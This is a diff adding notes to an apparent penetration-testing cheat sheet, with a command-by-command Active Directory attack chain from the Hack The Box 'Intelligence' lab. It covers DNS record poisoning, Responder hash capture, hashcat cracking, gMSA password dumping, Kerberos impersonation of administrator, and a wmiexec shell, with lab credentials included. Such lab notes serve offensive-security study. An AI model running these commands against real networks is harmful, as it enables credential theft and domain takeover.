@@ -54,3 +54,31 @@ rpcclient $> setuserinfo2 audit2020 23 'Bwiz123!!!'
 
 ```
 
+### Yet another way to get that Hash
+
+```
+From intelligence htb, we can use dnstool.py and responder to grab a hash, maybe.
+
+python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r webfakedomain.intelligence.htb --data attackerip victimip
+
+
+Then, boom:
+
+responder -I tun0 -A
+
+Then, just crack it:
+
+hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
+
+python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
+
+rdate -n $ip
+
+getST.py -dc-ip $ip -spn www/dc.intelligence.htb -hashes :486b1ed2229329984333a964b71045e9 -impersonate administrator intelligence.htb/svc_int
+
+
+KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
+
+Boom, Shell!
+
+```
